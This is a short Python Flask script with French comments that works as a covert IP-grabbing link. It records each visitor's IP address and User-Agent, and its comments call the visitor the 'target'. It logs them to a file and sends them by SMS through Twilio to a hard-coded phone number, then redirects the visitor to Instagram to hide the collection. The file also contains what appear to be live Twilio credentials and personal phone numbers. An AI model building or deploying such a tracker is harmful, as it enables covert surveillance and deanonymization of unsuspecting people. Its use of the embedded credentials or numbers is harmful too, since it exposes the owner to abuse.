from flask import Flask, request, redirect
from twilio.rest import Client

app = Flask(__name__)

# Remplace par tes informations Twilio
account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
auth_token = 'ec746c04233667b9836c82d9512a9ee9'
from_number = '+12524866318'
to_number = '+33635960569'

client = Client(account_sid, auth_token)

# Numéro Twilio et destinataire
from_phone_number = '+12524866318'  # Ton numéro Twilio
to_phone_number = '+33635960569'  # Le numéro de téléphone où tu veux recevoir les SMS (remplace par ton propre numéro)

def send_sms(ip_address, user_agent):
    body = f"IP Address: {ip_address}\nUser Agent: {user_agent}"
    try:
        message = client.messages.create(
            body=body,
            from_=from_phone_number,
            to=to_phone_number
        )
        print(f"Message sent: {message.sid}")
    except Exception as e:
        print(f"Error sending SMS: {e}")

def log_to_file(ip_address, user_agent):
    # Enregistrer l'IP et l'User-Agent dans un fichier log.txt
    with open('log.txt', 'a') as log_file:
        log_file.write(f"IP: {ip_address}, User-Agent: {user_agent}\n")

@app.route('/')
def index():
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)  # Récupère l'IP publique réelle
    user_agent = request.headers.get('User-Agent')  # Récupère le User-Agent de la cible
    
    # Log dans le fichier
    log_to_file(ip_address, user_agent)

    # Envoie un SMS avec l'IP et User-Agent
    send_sms(ip_address, user_agent)

    # Redirige vers une image ou une page (exemple ici avec une image)
    return redirect("https://www.instagram.com")  # Remplace par ton URL d'image

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
